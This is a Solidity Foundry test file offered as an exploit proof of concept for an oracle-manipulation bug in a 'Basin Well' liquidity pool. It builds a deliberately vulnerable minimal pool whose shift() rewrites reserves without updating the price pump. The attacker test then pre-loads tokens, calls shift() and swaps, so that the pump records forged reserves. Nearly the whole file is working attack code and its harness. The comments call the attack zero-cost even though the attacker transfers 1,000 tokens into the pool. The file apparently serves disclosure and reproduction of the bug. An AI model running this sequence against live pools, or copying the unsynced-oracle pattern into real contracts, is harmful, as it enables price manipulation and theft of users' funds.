// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

/*
    Exploit PoC for Basin Well oracle-manipulation bug caused by shift()/sync()
    Written for Foundry – run with `forge test -vv`

    The PoC builds a **minimal reproducer** rather than instantiating the full‐
    featured Basin Well (whose clone-based immutable-args layout is painful to
    set up in a test).  The reproducer keeps the relevant logic unchanged:
      * `shift()` overwrites stored reserves WITHOUT first calling _updatePumps()
      * `swapFrom()` (or any function that calls _updatePumps() *before* the
        state-changing part) will therefore feed **forged reserves** into the
        Pump although the pool finishes the block with honest balances again.

    The test shows that the Pump records a fake sample that differs from the
    real, post-swap reserves – proving oracle corruption is possible in one
    atomic transaction and at zero economic cost to the attacker.
*/

import "forge-std/Test.sol";

/// ------------------------------------------------------------------------
///                              MOCKS
/// ------------------------------------------------------------------------

/* Simple ERC-20 with unrestricted mint() helper – more than enough for the PoC */
contract MockERC20 {
    string public name;
    string public symbol;
    uint8  public decimals = 18;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event  Transfer(address indexed from, address indexed to, uint256 amount);
    event  Approval(address indexed owner, address indexed spender, uint256 amount);

    constructor(string memory _name, string memory _symbol) {
        name   = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        emit Transfer(address(0), to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "ERC20: allowance");
        allowance[from][msg.sender] = allowed - amount;
        _transfer(from, to, amount);
        return true;
    }

    /* INTERNAL */
    function _transfer(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "ERC20: balance");
        balanceOf[from] -= amount;
        balanceOf[to]   += amount;
        emit Transfer(from, to, amount);
    }
}

/* Very light-weight Pump that simply stores the last sample it receives */
contract MockPump {
    uint256[] public lastSample; // dynamic array so we can store an arbitrary set of reserves

    function update(uint256[] memory reserves, bytes memory) external returns (bytes memory) {
        lastSample = reserves;
        return ""; // pumps normally return opaque data; irrelevant here
    }

    /* convenience getter */
    function getSample() external view returns (uint256[] memory) {
        return lastSample;
    }
}

/// ------------------------------------------------------------------------
///                     VULNERABLE WELL -  minimal clone
/// ------------------------------------------------------------------------

contract SimpleWell {
    MockERC20 public immutable token0;
    MockERC20 public immutable token1;
    MockPump  public immutable pump;

    /* Stored (supposed) reserves – these are what the Pump/Oracle will see */
    uint256[2] public reserves;

    constructor(MockERC20 _t0, MockERC20 _t1, MockPump _pump) {
        token0 = _t0;
        token1 = _t1;
        pump   = _pump;
    }

    /* Anyone can call sync() to make stored reserves match real balances.
       In the genuine Basin implementation this function ALSO misses the
       _updatePumps() call and can therefore be abused identically.           */
    function sync() public {
        reserves[0] = token0.balanceOf(address(this));
        reserves[1] = token1.balanceOf(address(this));
    }

    /* INTERNAL helper to write reserves */
    function _setReserves(uint256[2] memory newReserves) internal {
        reserves = newReserves;
    }

    /* INTERNAL helper that pushes current *stored* reserves into the Pump */
    function _updatePumps() internal {
        uint256[] memory r = new uint256[](2);
        r[0] = reserves[0];
        r[1] = reserves[1];
        pump.update(r, "");
    }

    /* ------------------------  VULNERABLE FUNCTION  --------------------- */
    /* Identical in spirit to Basin’s shift(): it      */
    /*   1. reads *balances* (real funds)              */
    /*   2. overwrites stored reserves                 */
    /*   3. DOES *NOT* call _updatePumps()             */
    /* Anybody can therefore push arbitrary numbers that*/
    /* will be used by the next _updatePumps() call.   */
    function shift(MockERC20 /* tokenOut, ignored in this mini version */) external {
        uint256[2] memory newRes;
        newRes[0] = token0.balanceOf(address(this));
        newRes[1] = token1.balanceOf(address(this));
        _setReserves(newRes);
        /* no _updatePumps() -> oracle now out of sync until another pool
           action performs the missing pump update                        */
    }

    /* A toy swapFrom(): enough to demonstrate that it  */
    /* updates the Pump *before* mutating reserves.     */
    function swapFrom(MockERC20 fromToken, MockERC20 toToken, uint256 amountIn) external {
        /* user pays */
        require(fromToken.transferFrom(msg.sender, address(this), amountIn), "transferFrom failed");

        /* ---- oracle is updated with *currently stored* (potentially faked) reserves ---- */
        _updatePumps();

        /* 1-for-1 swap – economics don’t matter, we just want state changes */
        require(toToken.transfer(msg.sender, amountIn), "transfer back failed");

        /* finally write the *real* post-swap balances to storage             */
        uint256[2] memory newRes;
        newRes[0] = token0.balanceOf(address(this));
        newRes[1] = token1.balanceOf(address(this));
        _setReserves(newRes);
    }
}

/// ------------------------------------------------------------------------
///                             EXPLOIT TEST
/// ------------------------------------------------------------------------

contract ExploitShiftOracleTest is Test {
    MockERC20 token0;
    MockERC20 token1;
    MockPump  pump;
    SimpleWell well;

    address attacker = address(0xBEEF);

    function setUp() public {
        /* Deploy mocks */
        token0 = new MockERC20("Token0", "TK0");
        token1 = new MockERC20("Token1", "TK1");
        pump   = new MockPump();
        well   = new SimpleWell(token0, token1, pump);

        /* Attacker receives ample funds */
        token0.mint(attacker, 1_000_000 ether);
        token1.mint(attacker, 1_000_000 ether);

        /* Provide *honest* initial liquidity: 100 TK0 + 100 TK1 */
        vm.startPrank(attacker);
        token0.approve(address(well), type(uint256).max);
        token1.approve(address(well), type(uint256).max);
        token0.transfer(address(well), 100 ether);
        token1.transfer(address(well), 100 ether);
        vm.stopPrank();

        well.sync(); // stored reserves = 100 / 100, oracle still untouched
    }

    function testOracleCorruptionViaShift() public {
        /* ---------------- 1) Manipulation phase (same block) ---------------- */

        /* a) Attacker pre-loads extra TK0 into the pool WITHOUT touching reserves */
        uint256 preload = 1_000 ether;
        vm.prank(attacker);
        token0.transfer(address(well), preload); // real balance now 1 100 TK0, stored reserve still 100 TK0

        /* b) Call vulnerable shift() – overwrites stored reserves (now 1 100 / 100)
              but crucially *does not* ping the Pump                              */
        vm.prank(attacker);
        well.shift(token0);

        /* ---------------- 2) Trigger Pump update with forged data ------------- */

        /* Immediately perform a tiny swap, which:
             • first pulls attacker’s token0
             • then calls _updatePumps() (reads the *forged* 1 100 / 100 reserves)
             • finally does the token transfers and rewrites correct reserves     */
        vm.prank(attacker);
        well.swapFrom(token0, token1, 1 ether); // any non-zero amount works

        /* ---------------- 3) Assertions -------------------------------------- */

        /* Pump recorded the fake sample (1 100 / 100)                           */
        uint256[] memory sample = pump.getSample();
        uint256 pumped0 = sample[0];
        uint256 pumped1 = sample[1];

        /* Pool ends the block with *real* balances:
            1 101 TK0   (1 100 pre-load + 1 from swapIn)
              99 TK1   (100 initial - 1 sent out)                                 */
        uint256 real0 = well.reserves(0);
        uint256 real1 = well.reserves(1);

        /* The oracle is now out of sync – exactly the vulnerability described.   */
        assertTrue(
            pumped0 != real0 || pumped1 != real1,
            "Pump should store manipulated reserves different from real ones"
        );

        emit log_named_uint("Pump reserve[0] (manipulated)", pumped0);
        emit log_named_uint("Real reserve[0] (honest)",       real0);
        emit log_named_uint("Pump reserve[1] (manipulated)", pumped1);
        emit log_named_uint("Real reserve[1] (honest)",       real1);
    }
}